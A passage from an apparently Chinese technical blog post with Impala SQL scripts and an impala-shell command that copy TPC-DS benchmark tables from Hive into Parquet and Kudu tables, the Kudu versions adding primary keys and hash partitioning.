class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_returns;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_sales</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_sales;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer_address;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer_address</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer_address;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer_demographics;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer_demographics</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer_demographics;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> date_dim;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.date_dim</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.date_dim;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> household_demographics;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.household_demographics</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.household_demographics;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> income_band;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.income_band</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.income_band;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> inventory;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.inventory</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.inventory;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> item;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.item</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.item;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> promotion;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.promotion</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.promotion;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> reason;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.reason</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.reason;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> ship_mode;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.ship_mode</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.ship_mode;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> store_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store_returns</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store_returns;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> store_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store_sales</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store_sales;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="keyword">store</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> time_dim;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.time_dim</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.time_dim;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> warehouse;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.warehouse</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.warehouse;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_page;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_page</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_page;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_returns</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_returns;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_sales</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_sales;</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_site;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_site</span><br><span class="line"><span class="keyword">stored</span> <span class="keyword">as</span> parquet</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_site;</span><br></pre></td></tr></table></figure><p>然后用命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impala-shell -i datanode127 --var=DB=tpcds_parquet_500 --var=HIVE_DB=tpcds_text_500 -f alltables_parquet.sql</span><br></pre></td></tr></table></figure><p>理论上也能这么生成<code>Kudu</code>表，只要用下面的语句。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">database</span> <span class="keyword">if</span> <span class="keyword">exists</span> $&#123;<span class="keyword">VAR</span>:DB&#125; <span class="keyword">cascade</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> $&#123;<span class="keyword">VAR</span>:DB&#125;;</span><br><span class="line"><span class="keyword">use</span> $&#123;<span class="keyword">VAR</span>:DB&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> call_center;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.call_center</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (cc_call_center_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.call_center;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_page;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_page</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (cp_catalog_page_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_returns</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (cr_returned_date_sk,cr_returned_time_sk,cr_item_sk,cr_refunded_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(cr_returned_date_sk,cr_returned_time_sk,cr_item_sk,cr_refunded_customer_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_returns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> catalog_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.catalog_sales</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (cs_sold_date_sk,cs_sold_time_sk,cs_ship_date_sk,cs_bill_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(cs_sold_date_sk,cs_sold_time_sk,cs_ship_date_sk,cs_bill_customer_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.catalog_sales;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer_address;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer_address</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (ca_address_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer_address;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer_demographics;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer_demographics</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (cd_demo_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer_demographics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> customer;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.customer</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (c_customer_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.customer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> date_dim;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.date_dim</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (d_date_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.date_dim;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> household_demographics;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.household_demographics</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (hd_demo_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.household_demographics;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> income_band;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.income_band</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (ib_income_band_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.income_band;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> inventory;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.inventory</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (inv_date_sk,inv_item_sk,inv_warehouse_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(inv_date_sk,inv_item_sk,inv_warehouse_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.inventory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> item;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.item</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (i_item_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.item;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> promotion;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.promotion</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (p_promo_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.promotion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> reason;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.reason</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (r_reason_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.reason;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> ship_mode;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.ship_mode</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (sm_ship_mode_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.ship_mode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> store_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store_returns</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (sr_returned_date_sk,sr_return_time_sk,sr_item_sk,sr_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(sr_returned_date_sk,sr_return_time_sk,sr_item_sk,sr_customer_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store_returns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> store_sales;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store_sales</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (ss_sold_date_sk,ss_sold_time_sk,ss_item_sk,ss_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(ss_sold_date_sk,ss_sold_time_sk,ss_item_sk,ss_customer_sk) <span class="keyword">PARTITIONS</span> <span class="number">5</span></span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store_sales;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> <span class="keyword">store</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.store</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (s_store_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.store;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> time_dim;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.time_dim</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (t_time_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.time_dim;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> warehouse;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.warehouse</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (w_warehouse_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.warehouse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_page;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_page</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (wp_web_page_sk)</span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br><span class="line"><span class="keyword">as</span> <span class="keyword">select</span> * <span class="keyword">from</span> $&#123;<span class="keyword">VAR</span>:HIVE_DB&#125;.web_page;</span><br><span class="line"></span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> <span class="keyword">if</span> <span class="keyword">exists</span> web_returns;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> $&#123;<span class="keyword">VAR</span>:DB&#125;.web_returns</span><br><span class="line">PRIMARY <span class="keyword">KEY</span> (wr_returned_date_sk,wr_returned_time_sk,wr_item_sk,wr_refunded_customer_sk)</span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span>(wr_returned_date_sk,wr_returned_time_sk,wr_item_sk,wr_refunded_customer_sk) <span class="keyword">PARTITIONS</span> 